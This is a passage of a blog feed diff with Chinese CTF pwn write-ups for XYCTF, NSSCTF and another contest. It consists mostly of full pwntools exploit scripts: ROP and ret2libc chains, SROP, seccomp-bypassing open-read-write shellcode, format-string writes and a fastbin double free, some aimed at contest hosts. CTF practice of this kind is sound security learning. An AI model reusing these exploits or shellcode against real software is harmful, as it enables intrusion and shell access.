+puts_plt = 0x401060
+puts_got = 0x403FD8
+main_addr = 0x401222
+pop_rdi_ret = 0x401183
+ret = 0x40101a
+
+#gdb.attach(p)
+
+payload = b'a'*144 + p64(0x404500) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+p.sendlineafter(&quot;time\n&quot;,payload)
+
+puts_addr=u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00'))
+print(hex(puts_addr))
+
+libc_base = puts_addr - 0x80E50
+system_addr = libc_base + 0x50D70
+bin_addr = libc_base + 0x1D8678
+onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
+one_gadget = libc_base + onegadget[5]#3 4 
+
+print(&quot;base = &quot;,hex(libc_base))
+print(&quot;sys = &quot;,hex(system_addr))
+print(&quot;bin = &quot;,hex(bin_addr))
+
+#gdb.attach(p)
+#pause()
+pay = b'b'*144 + p64(0x404220) + p64(one_gadget) #+ p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
+p.sendlineafter(&quot;time\n&quot;,pay)
+
+p.interactive()
+</code></pre>
+<h3 id="orw2">orw*2</h3>
+<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1715003872143.png" alt="" loading="lazy"></figure>
+<p>开了沙盒打orw</p>
+<figure data-type="image" tabindex="2"><img src="https://l1u66.github.io//post-images/1715003881364.png" alt="" loading="lazy"></figure>
+<p>白给了栈地址和libc地址</p>
+<figure data-type="image" tabindex="3"><img src="https://l1u66.github.io//post-images/1715003888411.png" alt="" loading="lazy"></figure>
+<p>查看主逻辑发现存在栈溢出，因为已知栈地址，所以可以把栈迁移到输入的内容上，还有一点就是开了canary，需要在canary的位置输入+号防止改变canary，再有就是要以double形式输入，注意flag.txt的截断问题(格式转换有点丑，轻点骂)</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+import struct
+
+#p = process('./oorrww')
+p = remote(&quot;36.212.170.17&quot;,9998)
+elf = ELF('./oorrww')
+
+#gdb.attach(p)
+re = p.recvuntil(b'!', drop = True).split()
+print(&quot;re =&quot;,re)
+num11 = float(re[5])
+num1 = struct.unpack('&lt;Q', struct.pack('&lt;d', num11))[0]
+stack = int(hex(num1),16)
+print(&quot;stack =&quot;,hex(stack))
+
+binary_data = struct.pack('&gt;Q', stack)
+stack1 = struct.unpack('&gt;d', binary_data)[0]
+binary_data = struct.pack('&gt;Q', stack+8)
+stack2 = struct.unpack('&gt;d', binary_data)[0]
+binary_data = struct.pack('&gt;Q', stack+8*13)
+stack3 = struct.unpack('&gt;d', binary_data)[0]
+
+num22 = float(re[6])
+num2 = struct.unpack('&lt;Q', struct.pack('&lt;d', num22))[0]
+scanf = int(hex(num2),16)
+base = scanf - 0x62090
+print(&quot;base =&quot;,hex(base))
+
+leave = base + 0x4da83
+print(&quot;leave =&quot;,hex(leave))
+binary_data = struct.pack('&gt;Q', leave)
+leave1 = struct.unpack('&gt;d', binary_data)[0]
+
+rdi = base + 0x2a3e5
+print(&quot;rdi =&quot;,hex(rdi))
+binary_data = struct.pack('&gt;Q', rdi)
+rdi1 = struct.unpack('&gt;d', binary_data)[0]
+
+rsi = base + 0x2be51
+print(&quot;rsi =&quot;,hex(rsi))
+binary_data = struct.pack('&gt;Q', rsi)
+rsi1 = struct.unpack('&gt;d', binary_data)[0]
+
+rdx_rcx_rbx = base + 0x108b03
+print(&quot;rdx_rcx_rbx =&quot;,hex(rdx_rcx_rbx))
+binary_data = struct.pack('&gt;Q', rdx_rcx_rbx)
+rdx_rcx_rbx1 = struct.unpack('&gt;d', binary_data)[0]
+
+ope = base + 0x1144E0
+print(&quot;ope =&quot;,hex(ope))
+binary_data = struct.pack('&gt;Q', ope)
+ope1 = struct.unpack('&gt;d', binary_data)[0]
+
+read = base + 0x1147D0
+print(&quot;read =&quot;,hex(read))
+binary_data = struct.pack('&gt;Q', read)
+read1 = struct.unpack('&gt;d', binary_data)[0]
+
+write = base + 0x114870
+print(&quot;write =&quot;,hex(write))
+binary_data = struct.pack('&gt;Q', write)
+write1 = struct.unpack('&gt;d', binary_data)[0]
+
+puts = base + 0x80E50
+print(&quot;puts =&quot;,hex(puts))
+binary_data = struct.pack('&gt;Q', puts)
+puts1 = struct.unpack('&gt;d', binary_data)[0]
+
+binary_data = struct.pack('&gt;Q', 0)
+_0 = struct.unpack('&gt;d', binary_data)[0]
+binary_data = struct.pack('&gt;Q', 1)
+_1 = struct.unpack('&gt;d', binary_data)[0]
+binary_data = struct.pack('&gt;Q', 3)
+_3 = struct.unpack('&gt;d', binary_data)[0]
+binary_data = struct.pack('&gt;Q', 0x100)
+_100 = struct.unpack('&gt;d', binary_data)[0]
+binary_data = struct.pack('&gt;Q', stack - 0x100)
+bss = struct.unpack('&gt;d', binary_data)[0]
+
+#orw
+p.sendlineafter(&quot;input:\n&quot;,str(1.1205295609968026e+253))#bp  flag.txt
+p.sendlineafter(&quot;input:\n&quot;,b&quot;0&quot;)
+p.sendlineafter(&quot;input:\n&quot;,str(rdi1))#rdi
+p.sendlineafter(&quot;input:\n&quot;,str(stack3))#flag
+p.sendlineafter(&quot;input:\n&quot;,str(rsi1))#rsi
+p.sendlineafter(&quot;input:\n&quot;,str(_0))#0
+p.sendlineafter(&quot;input:\n&quot;,str(ope1))#open
+p.sendlineafter(&quot;input:\n&quot;,str(rdi1))#rdi
+p.sendlineafter(&quot;input:\n&quot;,str(_3))#3
+p.sendlineafter(&quot;input:\n&quot;,str(rsi1))#rsi
+p.sendlineafter(&quot;input:\n&quot;,str(bss))#bss
+p.sendlineafter(&quot;input:\n&quot;,str(rdx_rcx_rbx1))#rdx
+p.sendlineafter(&quot;input:\n&quot;,str(_100))#0x100
+p.sendlineafter(&quot;input:\n&quot;,str(1.1205295609968026e+253))#0
+p.sendlineafter(&quot;input:\n&quot;,b&quot;0&quot;)#0
+p.sendlineafter(&quot;input:\n&quot;,str(read1))#read
+p.sendlineafter(&quot;input:\n&quot;,str(rdi1))#rdi
+p.sendlineafter(&quot;input:\n&quot;,str(_1))#1
+p.sendlineafter(&quot;input:\n&quot;,str(write1))#write
+
+p.sendlineafter(&quot;input:\n&quot;,b&quot;+&quot;)
+p.sendlineafter(&quot;input:\n&quot;,str(stack2))#stack
+pause()
+p.sendlineafter(&quot;input:\n&quot;,str(leave1))#leave
+
+p.interactive()
+</code></pre>
+<h1 id="sp">sp</h1>
+<p>相当于xyctf的srop和inviisible_flag（禁用了orw的orw），比赛时把syscall地址给搞错了🤡，到那就挂，测！在xy的srop代码基础上稍微改改就出了（队伍的恶人）,</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./sp&quot;)
+p = remote(&quot;36.212.170.17&quot;,9999)
+elf = ELF(&quot;./sp&quot;)
+syscall = 0x4010B0
+bss = 0x404260+0x500
+rdi = 0x4012ec
+leave = 0x4012e2
+
+#gdb.attach(p)
+sigframe = SigreturnFrame()
+sigframe.rax = 0
+sigframe.rdi = 0
+sigframe.rsi = 0
+sigframe.rdx = bss
+sigframe.rcx = 0x800
+sigframe.rsp = bss + 16
+sigframe.rbp = bss + 0x800
+sigframe.rip = syscall
+
+payload = b&quot;a&quot;*24 + p64(bss) + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
+p.send(payload)
+
+#pause()
+flag = bss
+sigframe0 = SigreturnFrame()
+sigframe0.rdi = constants.SYS_openat
+sigframe0.rsi = -100
+sigframe0.rdx = flag
+sigframe0.rcx = 0
+sigframe0.rsp = bss + 0x10 + 256 + 16
+sigframe0.rip = syscall
+
+sigframe1 = SigreturnFrame()
+sigframe1.rdi = constants.SYS_read
+sigframe1.rsi = 3
+sigframe1.rdx = bss - 0x100
+sigframe1.rcx = 50
+sigframe1.rsp = bss + 0x10 + 256*2 + 24 + 8
+sigframe1.rip = syscall
+
+
+sigframe2 = SigreturnFrame()
+sigframe2.rdi = constants.SYS_sendfile
+sigframe2.rsi = 1
+sigframe2.rdx = 3
+sigframe2.rcx = 0
+sigframe2.r8 = 50
+sigframe2.rsp = bss + 0x10 + 256*3
+sigframe2.rip = syscall
+
+pay = b&quot;flag.txt&quot; + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) #+ p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2)
+p.send(pay)
+p.interactive()
+</code></pre>
+<p>下面是mprotect+shellcode的做法</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./sp&quot;)
+p = remote(&quot;36.212.170.17&quot;,9999)
+elf = ELF(&quot;./sp&quot;)
+
+#gdb.attach(p)
+pop_rdi = 0x4012ec
+syscall = elf.plt['syscall']
+sigframe = SigreturnFrame()
+sigframe.rdi = 0
+sigframe.rsi = 0
+sigframe.rdx = 0x404300
+sigframe.rcx = 0x300
+sigframe.rbp = 0x404400
+sigframe.rsp = 0x404300
+sigframe.rip = syscall
+
+payload = b'a' * 0x28 + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
+p.send(payload)
+
+sigframe2 = SigreturnFrame()
+sigframe2.rdi = 10
+sigframe2.rsi = 0x404000
+sigframe2.rdx = 0x1000
+sigframe2.rcx = 7
+sigframe2.rsp = 0x404410
+sigframe2.rbp = 0x404500
+sigframe2.rip = syscall
+
+shellcode = shellcraft.openat(-100, 'flag.txt', 0, 0)
+shellcode += shellcraft.sendfile(1, 3, 0, 50)
+shellcode = asm(shellcode)
+
+#pause()
+payload = p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
+p.send(payload)
+
+#pause()
+payload = p64(0x404308) + shellcode
+p.send(payload)
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XYCTF]]></title>
+        <id>https://l1u66.github.io/post/xyctf/</id>
+        <link href="https://l1u66.github.io/post/xyctf/">
+        </link>
+        <updated>2024-05-01T10:14:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="hello_world">hello_world</h1>
+<p>两次栈溢出，第一次利用字符串的截断泄露出libc地址，第二次拿到shell</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./vuln&quot;)
+#p = remote(&quot;xyctf.top&quot;,44777)
+elf = ELF(&quot;./vuln&quot;)
+libc = elf.libc
+
+pay = b'a'*0x28
+p.sendafter(&quot;name: &quot;,pay)
+gdb.attach(p)
+base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00')) - 0x29d90
+print(&quot;base = &quot;,hex(base))
+sys = base + 0x50D70
+sh = base + 0x1D8678
+ret = base + 0x0000000000029139
+rdi = base + 0x000000000002a3e5
+pay += p64(ret) + p64(rdi) + p64(sh) + p64(sys)
+gdb.attach(p)
+p.sendafter(&quot;please input your name: &quot;,pay)
+
+p.interactive()
+</code></pre>
+<h1 id="inviisible_flag禁用了orw的orw">inviisible_flag（禁用了orw的orw）</h1>
+<p><img src="https://l1u66.github.io//post-images/1714558976331.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1714559012916.png" alt="" loading="lazy"><br>
+程序会执行输入的shellcode，开了沙盒禁用了execve和orw，禁用open可以用openat绕过，禁用read函数可以用pread绕过，后面禁用write我用的测信道爆破，看了wp发现sendfile64 (调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数</p>
+<h2 id="测信道爆破">测信道爆破</h2>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./vuln&quot;)
+#p = remote(&quot;xyctf.top&quot;,44777)
+#elf = ELF(&quot;./vuln&quot;)
+#libc = elf.libc
+
+#openat(0xffffff9c,flag,0)
+#pread(3,0x114514000,0x100,0)
+payload = asm('''
+	mov rax, 0x67616c66
+	push rax
+	mov rdi, 0xffffff9c
+	mov rsi,rsp
+	xor rdx,rdx
+	mov rax,257
+	syscall
+	''')
+payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
+
+def exp(dis,char):
+	pay = payload	
+	pay += asm('''
+	mov dl, byte ptr [rsi+{}]
+        mov cl, {}
+        cmp cl,dl
+        jz loop
+        mov al,60
+        syscall
+        loop:
+        jmp loop
+	'''.format(dis,char))
+	p.sendafter(&quot;again\n&quot;,pay)
+
+flag = &quot;&quot;
+
+for i in range(len(flag),50):
+	sleep(1)
+	print(&quot;flag : {}&quot;.format(flag))
+	for j in range(0x20,0x80):
+		#p = remote(&quot;xyctf.top&quot;,45966)
+		p = process(&quot;./vuln&quot;)
+		#gdb.attach(p)
+		try:
+			exp(i,j)
+			p.recvline(timeout=1)
+			flag += chr(j)
+			print(&quot;flag : &quot;,flag)
+			log.success(&quot;{} pos : {} success&quot;.format(i,chr(j)))
+			p.close()
+			break
+		except:           
+			p.close()
+</code></pre>
+<h2 id="sendfile绕过">sendfile绕过</h2>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./vuln&quot;)
+#p = remote(&quot;xyctf.top&quot;,44777)
+elf = ELF(&quot;./vuln&quot;)
+libc = elf.libc
+
+payload = asm(shellcraft.openat(0xffffff9c,b&quot;flag&quot;,0))	
+#payload = asm(shellcraft.openat(-100,b&quot;flag&quot;,0))	
+#-100 AT_FDCWD 表示当前目录
+payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
+payload += asm(shellcraft.sendfile(1,3,0,0x100))
+
+p.sendafter(&quot;again\n&quot;,payload)
+p.interactive()
+</code></pre>
+<h1 id="static_link">static_link</h1>
+<p>侥幸拿了个一血😋，静态编译直接生成ropchain</p>
+<pre><code>from ctypes import *
+from pwn import *
+io = process('./vuln')
+#io = remote(&quot;xyctf.top&quot;,50075)
+context(log_level='debug',arch='amd64', os='linux')
+elf = ELF('./vuln')
+
+
+from struct import pack
+
+# Padding goes here
+p = b''
+
+p += pack('&lt;Q', 0x0000000000409f8e) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000004c50e0) # @ .data
+p += pack('&lt;Q', 0x0000000000447fe7) # pop rax ; ret
+p += b'/bin//sh'
+p += pack('&lt;Q', 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
+p += pack('&lt;Q', 0x0000000000409f8e) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000004c50e8) # @ .data + 8
+p += pack('&lt;Q', 0x000000000043d1b0) # xor rax, rax ; ret
+p += pack('&lt;Q', 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
+p += pack('&lt;Q', 0x0000000000401f1f) # pop rdi ; ret
+p += pack('&lt;Q', 0x00000000004c50e0) # @ .data
+p += pack('&lt;Q', 0x0000000000409f8e) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000004c50e8) # @ .data + 8
+p += pack('&lt;Q', 0x0000000000451322) # pop rdx ; ret
+p += pack('&lt;Q', 0x00000000004c50e8) # @ .data + 8
+p += pack('&lt;Q', 0x000000000043d1b0) # xor rax, rax ; ret
+p += pack('&lt;Q', 0x0000000000447fe7) # pop rax ; ret
+p += p64(59)
+p += pack('&lt;Q', 0x0000000000401cd4) # syscall
+
+pay = b''
+#
+for i in range(len(p)):
+        pay += (ord(p[i:i+1])).to_bytes(1)
+payload = b'a'*40 + pay
+gdb.attach(p)
+io.sendafter(b'ret2??\n', payload)
+
+io.interactive()
+</code></pre>
+<h1 id="babygift">BabyGift</h1>
+<p><img src="https://l1u66.github.io//post-images/1714560701006.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1714560819606.png" alt="" loading="lazy"><br>
+存在栈溢出，查看汇编发现程序结束时rdi指向第二次输入的字符串，控制程序结束时调用printf函数便可以利用格式化字符串泄露出栈地址和libc地址，再调用main函数，控制第二次输入的字符串为/bin/sh，调用system函数即可拿到shell（偶尔printf函数调用失败，多试几次就可）</p>
+<h2 id="令人疑惑的是">令人疑惑的是</h2>
+<p>刚开始做时没有泄露栈地址，把栈直接放在bss段了，也调用system函数了，但是调用posix_spawn后创建的子进程就莫名其妙中止了，把posix_spawn的参数和能正常得到shell的参数比较后感觉没啥差异，感觉可能是在创建子进程时对栈的作用使得bss段中某些不能改的东西改了，把栈放回原位就成功拿到shell</p>
+<pre><code>from ctypes import *
+from pwn import *
+for i in range(50):
+	try:
+		p = process('./vuln')
+		#p = remote(&quot;xyctf.top&quot;,41584)
+		context(log_level='debug',arch='amd64', os='linux')
+		elf = ELF('./vuln')
+
+		#gdb.attach(p)
+		printf = 0x401080
+		ret = 0x000000000040101a
+		main = 0x40126A
+		pay = b'a'*32
+		p.sendafter(&quot;name:\n&quot;,pay)
+
+		payload = b'aa%25$p-%26$p'
+		p.sendafter(&quot;Your passwd:\n&quot;,payload.ljust(31,b'b') + p64(0x404000 + 0x600) + p64(ret) + p64(printf) + p64(main))
+
+		p.recvuntil(b'0x')
+		__libc_start_main = int(p.recv(12),16) - 128
+		base = __libc_start_main - 0x29DC0
+		print(&quot;base = &quot;,hex(base))
+		sys = base + 0x50D70
+		
+		p.recvuntil(b'0x')
+		stack = int(p.recv(12),16)
+		print(&quot;stack = &quot;,hex(stack))
+
+		#gdb.attach(p)
+		#one = base + 0xebd43
+		payload1 = b&quot;;/bin/sh&quot;*3 + b'a'*7+ p64(stack-0x100+11*8) + p64(0x401288)
+		p.sendline(payload1)
+		
+		
+		payload2 = b&quot;/bin/sh\x00&quot;*4 + b'a'*8
+		p.sendline(payload2 + p64(ret) + p64(sys))
+		p.interactive()
+	except:           
+		p.close()
+</code></pre>
+<h1 id="guestbook">GuestBook</h1>
+<p>控制rsp最后一位，在栈上提前写好后门函数，很容易栈迁移到后门函数</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+for i in range(50):
+	try:
+		#p = process(&quot;./pwn&quot;)
+		p = remote(&quot;xyctf.top&quot;,60462)
+		elf = ELF(&quot;./pwn&quot;)
+		libc = elf.libc
+
+		#gdb.attach(p)
+		sys = 0x40132B
+		p.sendlineafter(&quot;index\n&quot;,b'32')
+		p.sendlineafter(&quot;name:\n&quot;,p64(sys)*2)
+		p.sendlineafter(&quot;id:\n&quot;,b'32')
+		p.sendlineafter(&quot;index\n&quot;,b'-1')
+		p.interactive()	
+	except:           
+		p.close()
+</code></pre>
+<h1 id="simple_sropsrop和orw">simple_srop（srop和orw）</h1>
+<p>程序只有一个溢出了很多的read，程序给的read的长度我怕不过，所以先调用read函数在bss段写，同时也可以得知&quot;./flag&quot;字符串的地址,一个sigframe是256个字节（调试出来的）</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./vuln&quot;)
+p = remote(&quot;192.168.43.159&quot;,62578)
+elf = ELF(&quot;./vuln&quot;)
+
+syscall = 0x40129d
+bss = 0x404000 + 0x500
+srop = 0x401297
+
+#gdb.attach(p)
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_read
+sigframe.rdi = 0
+sigframe.rsi = bss
+sigframe.rsp = bss + 0x10
+sigframe.rdx = 0x1000
+sigframe.rip = syscall
+
+payload = b&quot;a&quot;*32 + p64(0) + p64(srop) + bytes(sigframe)
+p.send(payload)
+#pause()
+sh = bss
+flag = bss + 8
+sigframe0 = SigreturnFrame()
+sigframe0.rax = constants.SYS_open
+sigframe0.rdi = flag
+sigframe0.rsi = 0
+sigframe0.rsp = bss + 0x10 + 256
+sigframe0.rdx = 0
+sigframe0.rip = syscall
+
+sigframe1 = SigreturnFrame()
+sigframe1.rax = constants.SYS_read
+sigframe1.rdi = 3
+sigframe1.rsi = bss - 0x100
+sigframe1.rsp = bss + 0x10 + 256*2
+sigframe1.rdx = 0x100
+sigframe1.rip = syscall
+
+
+sigframe2 = SigreturnFrame()
+sigframe2.rax = constants.SYS_write
+sigframe2.rdi = 1
+sigframe2.rsi = bss - 0x100
+sigframe2.rsp = bss + 0x10 + 256*3
+sigframe2.rdx = 0x100
+sigframe2.rip = syscall
+
+pay = b&quot;/bin/sh\00&quot; + b&quot;./flag\x00\x00&quot; + p64(srop) + bytes(sigframe0) + p64(srop) + bytes(sigframe1) + p64(srop) + bytes(sigframe2)
+p.send(pay)
+p.interactive()
+</code></pre>
+<h1 id="fmt">fmt</h1>
+<p><img src="https://l1u66.github.io//post-images/1714562839765.png" alt="" loading="lazy"><br>
+开局送你libc地址，还有后门函数，然后有个scanf的格式化字符串，可以实现任意地址写，没有栈地址所以没法改返回地址，可以打exit hook，学习链接：<a href="https://www.cnblogs.com/pwnfeifei/p/15759130.html">https://www.cnblogs.com/pwnfeifei/p/15759130.html</a></p>
+<h2 id="由此我们可以想到两个方法来-get-shell">由此我们可以想到两个方法来 get shell</h2>
+<p>1.一个是改 rtld_lock_default_lock_recursive 或 rtld_lock_default_unlock_recursive 为 one_gadget<br>
+2.另一个更通用就是改 rtld_lock_default_lock_recursive 和rtld_lock_default_unlock_recursive 为 system ，并且把 _rtld_global._dl_load_lock.mutex的值改为 /bin/sh\x00</p>
+<h2 id="找hook偏移">找hook偏移</h2>
+<p><code>p _rtld_global</code>命令，但这道题这个命令貌似不太管用，在网上硬找到了偏移，本地2.31的_rtld_global地址：</p>
+<pre><code>0x7ffff7ffdf60 &lt;_rtld_global+3840&gt;:    0x0000000000000000    0x00007ffff7fd0150
+0x7ffff7ffdf70 &lt;_rtld_global+3856&gt;:    0x00007ffff7fd0160    0x0000000000000000
+</code></pre>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./vuln&quot;)
+#p = remote(&quot;192.168.163.1&quot;,52045)
+elf = ELF(&quot;./vuln&quot;)
+ld = ELF(&quot;./vuln&quot;)
+libc = elf.libc
+sys = 4199110#0x4012C6
+system = 4198560#0x4010A0
+sh = 4202558#0x40203E
+
+gdb.attach(p)
+p.recvuntil(b&quot;0x&quot;)
+base = int(p.recv(12),16) - 0x61CC0
+print(&quot;base = &quot;,hex(base)) #
+ld_base = base + 2236416
+print(&quot;ld_base = &quot;,hex(ld_base))
+_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
+_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
+_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
+__libc_atexit = base + 0x1ED608
+
+onegadget = [0xe3b2e,0xe3b31,0xe3b34]
+one_gadget = base + onegadget[0]
+
+p.sendline(b&quot;%8$lld%9$lldaaaa&quot; + p64(_dl_rtld_lock_recursive) + p64(_dl_load_lock))
+
+pause()
+p.sendline(str(system) + &quot; &quot; + str(sh))
+
+p.interactive()
+
+#0xe3b2e execve(&quot;/bin/sh&quot;, r15, r12)
+#constraints:
+#  [r15] == NULL || r15 == NULL || r15 is a valid argv
+#  [r12] == NULL || r12 == NULL || r12 is a valid envp
+
+#0xe3b31 execve(https://l1u66.github.io//post-images/1714566464339.png)
+#constraints:
+#  [r15] == NULL || r15 == NULL || r15 is a valid argv
+#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
+#
+#0xe3b34 execve(&quot;/bin/sh&quot;, rsi, rdx)
+#constraints:
+#  [rsi] == NULL || rsi == NULL || rsi is a valid argv
+#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
+</code></pre>
+<h1 id="malloc_flag">malloc_flag</h1>
+<p>额，申请一个0x100的堆块，然后show就有flag....甚至不用写脚本</p>
+<h1 id="intermittent">Intermittent</h1>
+<p>程序把输入的shellcode前12个字节每四个字节弄一起<br>
+如图<br>
+<img src="https://l1u66.github.io//post-images/1714566572863.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1714566393411.png" alt="" loading="lazy"></p>
+<h2 id="rep-movsb指令">rep movsb指令</h2>
+<p>这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所<br>
+指的区域<br>
+该题可以通过栈（两个字节，在rdi中写入rdx中的0x114514000），从而写入连续的shellcode</p>
+<h2 id="mov-movabs区别">mov movabs区别</h2>
+<p>movabs 和 mov 是 x86 汇编语言中的两条指令，用于将数据从一个位置移动到另一个位置。它们的区别在于操作数的大小和范围。<br>
+1.mov 指令只能用于将数据从一个寄存器或内存位置移动到另一个寄存器或内存位置。它可以处理 8 位、16 位、32 位或 64 位的数据。<br>
+2.movabs 指令是一个专门用于处理 64 位数据的指令，它用于将 64 位数据直接加载到寄存器中，而不需要使用其他寄存器作为中间传递。这个指令通常用于处理超过 32 位的整数或地址。<br>
+因此，movabs 指令主要用于处理 64 位数据，而 mov 指令可以用于处理不同大小的数据。</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./vuln&quot;)
+#p = remote(&quot;xyctf.top&quot;,44777)
+elf = ELF(&quot;./vuln&quot;)
+libc = elf.libc
+
+#gdb.attach(p)
+shellcode1 = b'\x52\x5F\xF3\xA4'
+shellcode = shellcode1+b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+
+p.send(shellcode.ljust(0x100,b&quot;\x90&quot;))
+
+p.interactive()
+</code></pre>
+<p>或者</p>
+<pre><code>0x0000000000000000:  52       push    rdx
+0x0000000000000001:  5E       pop     rsi
+0x0000000000000002:  0F 05    syscall 
+</code></pre>
+<p>极限调用read再次读取shellcode</p>
+<h1 id="fastfastfastdouble-free">fastfastfast（double free）</h1>
+<p>2.31的libc，存在uaf考虑fast bin double free,劫持malloc hook</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./vuln&quot;)
+#p = remote(&quot;xyctf.top&quot;,44777)
+elf = ELF(&quot;./vuln&quot;)
+libc = elf.libc
+
+def add(idx,data):
+	p.sendlineafter(&quot;&gt;&gt;&gt; &quot;, &quot;1&quot;)
+	p.sendlineafter(&quot;idx\n&quot;, str(idx))
+	p.sendafter(&quot;content\n&quot;, data)
+    	
+def dele(idx):
+	p.sendlineafter(&quot;&gt;&gt;&gt; &quot;, &quot;2&quot;)
+	p.sendlineafter(&quot;idx\n&quot;, str(idx))
+
+def view(idx):
+	p.sendlineafter(&quot;&gt;&gt;&gt; &quot;, &quot;3&quot;)
+	p.sendlineafter(&quot;idx\n&quot;, str(idx))
+	
+#gdb.attach(p)
+for i in range(0xf):
+	add(i,b'a'*8)
+for i in range(8):
+	dele(i)
+dele(8)
+dele(7)
+for i in range(7):
+	add(i,b'a'*8)
+add(9,p64(0x404070))
+
+add(10,b'b')
+add(11,b'c')
+add(12,b'\x00')
+
+view(12)
+base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00')) - 2021024
+print(&quot;base = &quot;,hex(base))
+#pause()
+onegadget = [0xe3b2e,0xe3b31,0xe3b34]
+one_gadget = base + onegadget[1]
+malloc_hook = base + (0x7f291e7a2b70-0x7f291e5b6000 )
+
+for i in range(0xf):
+	add(i,b'a'*8)
+for i in range(8):
+	dele(i)
+dele(8)
+dele(7)
+
+for i in range(7):
+	add(i,p64(0))
+
+add(9,p64(malloc_hook))
+
+add(10,b'b')
+add(11,b'c')
+print(&quot;malloc_hook = &quot;,hex(malloc_hook))
+#pause()
+add(12,p64(one_gadget))
+p.sendlineafter(&quot;&gt;&gt;&gt; &quot;, &quot;1&quot;)
+p.sendlineafter(&quot;idx\n&quot;, str(1))
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[NSSCTF Round#21 Basic]]></title>
+        <id>https://l1u66.github.io/post/nssctf-round21-basic/</id>
+        <link href="https://l1u66.github.io/post/nssctf-round21-basic/">
+        </link>
+        <updated>2024-04-06T10:16:09.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="fmt_checkin">fmt_checkin</h1>
+<p>经典格式化字符串,存在system函数，将printf的got表换成system的plt表即可</p>
+<pre><code>from ctypes import *
+from pwn import *
+
+#p = process('./fmt_checkin')
+p = remote(&quot;node2.anna.nssctf.cn&quot;,28679)
+context(log_level='debug',arch='amd64', os='linux')
+elf = ELF('./fmt_checkin')
+
+#gdb.attach(p)
+sys = 0x401265
+p.sendlineafter(&quot;send\n&quot;,b'-1')
+p.sendlineafter(&quot;payload\n&quot;,b&quot;%13$p&quot;)
+p.recvuntil(b&quot;0x&quot;)
+stack = int(p.recv(12),16) - 272 + 16
+print(&quot;stack = &quot;,stack)
+s1 = stack &amp; 0xffff
+p.sendlineafter(&quot;payload\n&quot;,b&quot;%&quot; + str(s1).encode(&quot;utf-8&quot;) + b&quot;c%13$hn&quot;)
+p.sendlineafter(&quot;payload\n&quot;,b&quot;%16440c%43$hn&quot;)
